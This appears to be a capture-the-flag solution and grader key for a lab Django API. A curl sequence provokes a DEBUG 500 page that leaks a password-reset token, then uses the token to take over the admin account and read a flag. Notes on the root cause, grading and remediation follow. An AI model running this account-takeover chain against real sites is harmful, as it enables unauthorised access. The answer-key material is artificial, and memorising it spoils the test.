# Solution — C07 (Django debug → reset token → admin)

Maps to writeup para 56-67: DEBUG enabled, password reset 500s because SMTP is broken, the debug page
renders the drafted mail including the reset token, the token resets any internal user's password.

```bash
A='Host: chat-api.corp.lab'; U=https://127.0.0.1:18503

curl -sk -H "$A" -H 'Content-Type: application/json' \
  -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code} %{size_download}\n' \
  $U/api/auth/password_reset
# 500 127374

grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1
# token=01c072d9398c547ec5eb138217bfee78

curl -sk -H "$A" -H 'Content-Type: application/json' \
  -d '{"token":"01c072…","password":"NewPass-Aa1!"}' $U/api/auth/password_reset/confirm
# {"detail":"password updated"}      # replay the same token -> 400

TOK=$(curl -sk -H "$A" -H 'Content-Type: application/json' \
  -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' $U/api/auth/login | jq -r .token)
curl -sk -H "$A" -H "Authorization: Bearer $TOK" $U/api/chats | jq -r '.results[].body' | grep FLAG
```

Why it works (the writeup's own root cause): `DEBUG=True` renders the traceback **and the local
variables** of every frame. The view assembles the reset mail as a local string before handing it to
`EmailMessage`; the SMTP host refuses the connection, so the exception is raised *after* the token was
generated — and the technical page prints the string. `DEBUG=False` would return a bare 500.

Grading notes:

- the token is single use and bound to the user whose address was requested;
- an agent login cannot read the admin-only chat, so "I logged in" is not a pass;
- `/api/users/` is admin-only, anonymous is refused (401/403);
- 404s are still clean — the leak is only in the unhandled 500.

Remediation, as in the writeup: `DEBUG=False` in production, and monitor the mail path (a broken SMTP
should never surface a token).
